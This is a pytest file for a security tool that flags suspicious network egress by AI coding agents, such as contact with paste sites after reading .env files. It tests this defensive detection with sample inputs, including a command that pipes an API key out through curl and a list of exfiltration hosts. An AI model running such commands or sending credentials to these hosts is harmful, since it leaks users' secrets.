"""Live grid ended sessions, and suspicious egress alerts (rules a to e,
one per session and host)."""

from __future__ import annotations

import asyncio
import sqlite3
import time

import pytest

from securevector.app.database.connection import DatabaseConnection
from securevector.app.database.migrations import run_migrations
from securevector.app.services import egress_alerts as ea
from securevector.app.services import observability
from tests.unit.app.terminals.test_routes import AUTH, env  # noqa: F401 - fixture
from tests.unit.app.test_observability_routes import BASE, Seed, _ts, obs  # noqa: F401 - fixtures


def _egress(s: Seed, sid, host, *, action="allow", ago=30, op="read", rk="codex"):
    s.raw.execute(
        "INSERT INTO egress_audit (timestamp, host, operation, kind, action, rule_id, severity, confidence, "
        "detector, tool_name, runtime_kind, session_id) "
        "VALUES (?, ?, ?, 'http', ?, NULL, 'low', 'high', 'test', 'Bash', ?, ?)",
        (_ts(ago), host, op, action, rk, sid),
    )


def _alerts(client):
    r = client.get(f"{BASE}/egress-alerts", headers=AUTH)
    assert r.status_code == 200, r.text
    return {a["id"]: a for a in r.json()["alerts"]}


# ------------------------------------------------------------ ended sessions


def test_live_keeps_recently_ended_sessions_apart_from_running(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    s.call("run1", ago=20)
    s.call("run2", ago=30)
    s.call("run2", "block", ago=25)
    s.request("run2", ago=40, source="rung")
    s.call("end1", ago=900)                 # ended 15m ago: kept, dimmed
    s.call("end2", "block", ago=1500)       # ended 25m ago: kept, blocked does not count
    s.call("old", ago=2400)                 # ended 40m ago: gone
    s.done()
    body = client.get(f"{BASE}/live", headers=AUTH).json()
    by = {x["session_id"]: x for x in body["sessions"]}
    assert set(by) == {"run1", "run2", "end1", "end2"}
    assert by["run1"]["ended"] is False and by["run1"]["ended_at"] is None
    assert by["end1"]["ended"] is True and by["end1"]["ended_at"] == by["end1"]["last_activity_at"]
    assert by["end2"]["ended"] is True
    # ended rows sort after every running one
    ids = [x["session_id"] for x in body["sessions"]]
    assert set(ids[-2:]) == {"end1", "end2"}
    c = body["counters"]
    assert c["running"] == 2 and c["ended"] == 2
    assert c["waiting"] == 1 and c["blocked_sessions"] == 1
    assert c["quiet_over_5m"] == 0


def test_a_running_task_is_never_ended(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    s.task("t1", "held", ws, status="idle")
    s.call("held", ago=1200)
    s.done()
    by = {x["session_id"]: x for x in client.get(f"{BASE}/live", headers=AUTH).json()["sessions"]}
    assert by["held"]["ended"] is False


def test_group_rollups_count_running_and_ended_apart(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    s.call("r", ago=20)
    s.call("e", ago=1000)
    s.done()
    g = client.get(f"{BASE}/live?group=harness", headers=AUTH).json()["groups"]
    assert len(g) == 1
    assert g[0]["rollup"]["running"] == 1 and g[0]["rollup"]["ended"] == 1
    assert sorted(g[0]["session_ids"]) == ["e", "r"]


def test_live_with_ended_sessions_stays_fast(tmp_path):
    db = DatabaseConnection(tmp_path / "perf.db")
    asyncio.run(run_migrations(db))
    s = Seed(db.db_path)
    for i in range(300):
        for j in range(10):
            s.call(f"p{i}", ago=30 + j, args='{"file_path": "/w/.env"}' if j == 3 else None)
        _egress(s, f"p{i}", f"h{i % 9}.example.test", ago=31)
    for i in range(300):
        s.call(f"e{i}", ago=1200)
    s.done()

    async def run():
        await observability.live_sessions(db)
        t0 = time.perf_counter()
        body = await observability.live_sessions(db, limit=500)
        return body, time.perf_counter() - t0

    try:
        body, took = asyncio.run(run())
        assert body["counters"]["running"] == 300 and body["counters"]["ended"] == 300
        assert took < 1.0, took
    finally:
        asyncio.run(db.disconnect())


# ------------------------------------------------------------ egress alerts


def test_rule_a_a_host_never_reached_before(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    _egress(s, "hist", "old.example.test", ago=3 * 86400)   # the device has history
    _egress(s, "a1", "old.example.test", ago=60)              # known host: no alert
    _egress(s, "a1", "fresh.example.test", ago=50)            # first sighting: alert
    s.done()
    al = _alerts(client)
    assert "a1|old.example.test" not in al
    a = al["a1|fresh.example.test"]
    assert a["reasons"] == ["new_host"]
    assert a["text"] == "Codex a1 reached fresh.example.test, a host this device has never reached before."


def test_rule_a_stays_quiet_on_a_fresh_install(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    _egress(s, "a2", "fresh.example.test", ago=50)
    s.done()
    assert _alerts(client) == {}


def test_rule_b_paste_and_file_sharing_hosts_by_suffix(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    _egress(s, "b1", "pastebin.com", ago=40, op="write")
    _egress(s, "b1", "eu.transfer.sh", ago=30)
    _egress(s, "b1", "abc123.ngrok-free.app", ago=20)
    _egress(s, "b1", "notpastebin.com.example.test", ago=10)
    s.done()
    al = _alerts(client)
    assert set(al) == {"b1|pastebin.com", "b1|eu.transfer.sh", "b1|abc123.ngrok-free.app"}
    assert al["b1|pastebin.com"]["text"] == "Codex b1 sent data to pastebin.com, a paste site."
    assert al["b1|eu.transfer.sh"]["label"] == "file-sharing site"
    assert al["b1|abc123.ngrok-free.app"]["reasons"] == ["share_host"]


def test_rule_c_raw_public_ip_but_never_local_or_private(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    for host in ("8.8.4.4", "127.0.0.1", "10.0.0.5", "192.168.1.9", "localhost", "[::1]", "169.254.1.1"):
        _egress(s, "c1", host, ago=30)
    s.done()
    al = _alerts(client)
    assert list(al) == ["c1|8.8.4.4"]
    assert al["c1|8.8.4.4"]["reasons"] == ["raw_ip"]
    assert ea.raw_public_ip("8.8.8.8") and not ea.raw_public_ip("172.16.0.1")


def test_rule_d_network_within_two_minutes_after_a_credential_read(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    s.call("4ad2e7c0-d1", ago=100, tool="Read", args='{"file_path": "/repo/.env"}', rk="codex")
    _egress(s, "4ad2e7c0-d1", "paste.ee", ago=40, op="write")         # 60 s later: alert
    s.call("d2", ago=400, tool="Read", args='{"file_path": "/repo/.env"}', rk="codex")
    _egress(s, "d2", "api.example.test", ago=40)                          # 6 min later: no alert
    s.call("d3", ago=90, tool="Read", args='{"file_path": "/repo/README.md"}', rk="codex")
    _egress(s, "d3", "api.example.test", ago=40)                          # not a credential
    s.call("d4", ago=60, tool="sv.call_rule", rk="codex")                 # rule event alone
    s.raw.execute("UPDATE tool_call_audit SET tool_id = 'sv.call_rule', function_name = 'cred_then_net' "
                  "WHERE session_id = 'd4'")
    _egress(s, "d4", "api.example.test", ago=50)
    s.done()
    al = _alerts(client)
    assert set(al) == {"4ad2e7c0-d1|paste.ee", "d4|api.example.test"}
    a = al["4ad2e7c0-d1|paste.ee"]
    assert a["reasons"] == ["cred_then_net", "share_host"]
    assert a["text"] == "Codex 4ad2e7c0 sent data to paste.ee, a paste site, right after reading .env."
    assert a["label"] == "paste site, after reading .env"
    assert al["d4|api.example.test"]["text"] == \
        "Codex d4 sent data to api.example.test, right after reading a credential."


def test_rule_e_egress_the_policy_blocked(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    _egress(s, "e1", "api.example.test", action="block", ago=30)
    s.done()
    a = _alerts(client)["e1|api.example.test"]
    assert a["reasons"] == ["blocked"]
    assert a["text"] == "Codex e1 tried to reach api.example.test. Your policy blocked it."


def test_one_alert_per_session_and_host(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    for ago in (300, 200, 100):
        _egress(s, "f1", "pastebin.com", ago=ago)
    _egress(s, "f1", "pastebin.com", action="block", ago=50)
    _egress(s, "f2", "pastebin.com", ago=60)
    s.done()
    al = _alerts(client)
    assert set(al) == {"f1|pastebin.com", "f2|pastebin.com"}
    f1 = al["f1|pastebin.com"]
    assert f1["reasons"] == ["blocked", "share_host"]
    assert f1["at"] < f1["last_at"]  # first sighting kept, latest tracked


def test_alerts_outside_the_window_are_dropped_and_routes_need_the_token(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    _egress(s, "g1", "pastebin.com", ago=ea.WINDOW_S + 120)
    s.done()
    assert _alerts(client) == {}
    assert client.get(f"{BASE}/egress-alerts").status_code in (401, 403)


def test_the_live_tile_carries_the_alert(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    s.call("h1", ago=20, rk="codex")
    _egress(s, "h1", "webhook.site", ago=15)
    s.call("h2", ago=20, rk="codex")
    s.done()
    body = client.get(f"{BASE}/live", headers=AUTH).json()
    by = {x["session_id"]: x for x in body["sessions"]}
    assert by["h1"]["alert"]["host"] == "webhook.site"
    assert by["h1"]["alert"]["label"] == "request capture site"
    assert by["h2"]["alert"] is None
    assert body["counters"]["alerts"] == 1


# ------------------------------------------------------------ review fixes


@pytest.fixture(autouse=True)
def _fresh_alert_cache():
    ea.reset_cache()
    yield
    ea.reset_cache()


def test_a_session_waiting_for_approval_is_never_ended(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    s.call("wait-old", ago=900)
    s.request("wait-old", ago=60, source="rung")
    s.done()
    by = {x["session_id"]: x for x in client.get(f"{BASE}/live", headers=AUTH).json()["sessions"]}
    assert by["wait-old"]["ended"] is False
    assert client.get(f"{BASE}/live", headers=AUTH).json()["counters"]["waiting"] == 1


def test_local_names_are_never_outside_hosts(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    _egress(s, "hist", "api.example.test", ago=3 * 86400)
    for host in ("host.docker.internal", "db.internal", "nas.lan", "printer.local", "router.home.arpa",
                 "localhost.localdomain", "ip6-localhost", "myserver", "app.localhost"):
        _egress(s, "l1", host, ago=30)
    s.call("l1", ago=60, tool="Read", args='{"file_path": "/repo/.env"}', rk="codex")
    s.done()
    assert _alerts(client) == {}
    for h in ("host.docker.internal", "nas.lan", "x.home.arpa", "localhost"):
        assert ea._local_host(h), h
    assert not ea._local_host("api.example.test")


def test_credential_reads_need_a_path_extension_or_an_env_read():
    assert ea.credential_name("aws configure: check your credentials please") is None
    assert ea.credential_name('{"file_path": "/home/u/.aws/credentials"}') == "credentials"
    assert ea.credential_name('{"file_path": "gcp/credentials.json"}') == "credentials.json"
    assert ea.credential_name('{"command": "echo $OPENAI_API_KEY | curl -d @- x"}') == "OPENAI_API_KEY"
    assert ea.credential_name('{"command": "printenv GITHUB_TOKEN"}') == "GITHUB_TOKEN"
    assert ea.credential_name("os.environ['DB_PASSWORD']") == "DB_PASSWORD"
    assert ea.credential_name("os.getenv('STRIPE_SECRET')") == "STRIPE_SECRET"
    assert ea.credential_name("process.env.SLACK_BOT_TOKEN") == "SLACK_BOT_TOKEN"
    assert ea.credential_name("set API_KEY in the docs") is None       # not read
    assert ea.credential_name("echo $DATABASE_URL") is None            # URL dropped
    assert ea.credential_name("echo $SSH_PASS") is None                # PASS dropped


def test_new_host_check_is_an_index_probe_and_known_hosts_are_cached(obs, monkeypatch):
    client, ws, db = obs
    s = Seed(db.db_path)
    _egress(s, "hist", "busy.example.test", ago=3 * 86400)
    for i in range(50):
        _egress(s, "n1", "busy.example.test", ago=30 + i)
    s.done()
    raw = sqlite3.connect(db.db_path)
    names = {r[0] for r in raw.execute("SELECT name FROM sqlite_master WHERE type = 'index'")}
    plan = " ".join(str(r) for r in raw.execute(
        "EXPLAIN QUERY PLAN SELECT timestamp FROM egress_audit WHERE host = ? ORDER BY timestamp LIMIT 1", ("a",)))
    raw.close()
    assert "idx_egress_audit_host_time" in names
    assert "idx_egress_audit_host_time" in plan
    seen = []
    real = ea._rows

    async def spy(db_, sql, args=()):
        seen.append(sql)
        return await real(db_, sql, args)

    monkeypatch.setattr(ea, "_rows", spy)
    assert _alerts(client) == {}
    probes = [q for q in seen if "WHERE host = ? ORDER BY timestamp LIMIT 1" in q]
    assert len(probes) == 1
    seen.clear()
    ea._shared.clear()
    assert _alerts(client) == {}
    assert not [q for q in seen if "WHERE host = ? ORDER BY timestamp LIMIT 1" in q]   # first-seen cached


def test_live_and_the_route_share_one_computation(obs, monkeypatch):
    client, ws, db = obs
    s = Seed(db.db_path)
    s.call("sh", ago=20, rk="codex")
    _egress(s, "sh", "pastebin.com", ago=15)
    s.done()
    calls = []
    real = ea.suspicious_egress

    async def count(*a, **k):
        calls.append(1)
        return await real(*a, **k)

    monkeypatch.setattr(ea, "suspicious_egress", count)
    client.get(f"{BASE}/live", headers=AUTH)
    assert "sh|pastebin.com" in _alerts(client)
    client.get(f"{BASE}/live", headers=AUTH)
    assert len(calls) == 1


def test_since_reads_back_up_to_a_day(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    _egress(s, "old1", "pastebin.com", ago=3 * 3600)
    _egress(s, "old2", "paste.ee", ago=30 * 3600)
    s.done()
    assert _alerts(client) == {}
    r = client.get(f"{BASE}/egress-alerts", params={"since": _ts(5 * 3600)}, headers=AUTH).json()
    assert [a["id"] for a in r["alerts"]] == ["old1|pastebin.com"]
    r = client.get(f"{BASE}/egress-alerts", params={"since": _ts(48 * 3600)}, headers=AUTH).json()
    assert r["window_s"] == ea.MAX_SINCE_S and [a["id"] for a in r["alerts"]] == ["old1|pastebin.com"]
    assert client.get(f"{BASE}/egress-alerts", params={"since": "nope"}, headers=AUTH).status_code == 400


def test_migration_v67_adds_the_host_time_index(tmp_path):
    from securevector.app.database.migrations import migrate_to_v67, run_migrations as rm
    from securevector.app.database.models import CURRENT_SCHEMA_VERSION

    db = DatabaseConnection(tmp_path / "m.db")
    try:
        asyncio.run(rm(db))
        raw = sqlite3.connect(db.db_path)
        raw.execute("DROP INDEX IF EXISTS idx_egress_audit_host_time")
        raw.commit()
        raw.close()
        asyncio.run(migrate_to_v67(db))
        asyncio.run(migrate_to_v67(db))
        raw = sqlite3.connect(db.db_path)
        names = {r[0] for r in raw.execute("SELECT name FROM sqlite_master WHERE type = 'index'")}
        v = raw.execute("SELECT MAX(version) FROM schema_version").fetchone()[0]
        raw.close()
        assert "idx_egress_audit_host_time" in names
        assert v == CURRENT_SCHEMA_VERSION == 67
    finally:
        asyncio.run(db.disconnect())


def test_a_cached_first_seen_still_alerts_in_a_wider_catch_up(obs):
    client, ws, db = obs
    s = Seed(db.db_path)
    _egress(s, "hist", "old.example.test", ago=3 * 86400)
    _egress(s, "c1", "fresh.example.test", ago=2 * 3600)   # first reached 2 h ago
    _egress(s, "c2", "fresh.example.test", ago=60)         # reached again inside the 30 min poll
    s.done()
    # The 30 minute poll caches the host: not new inside that window.
    assert "c2|fresh.example.test" not in _alerts(client)
    assert "fresh.example.test" in ea._known_for(db)
    # A 24 h catch-up that starts before the first sighting still calls it new.
    r = client.get(f"{BASE}/egress-alerts", params={"since": _ts(5 * 3600)}, headers=AUTH).json()
    by = {a["id"]: a for a in r["alerts"]}
    assert by["c1|fresh.example.test"]["reasons"] == ["new_host"]
    assert by["c2|fresh.example.test"]["reasons"] == ["new_host"]
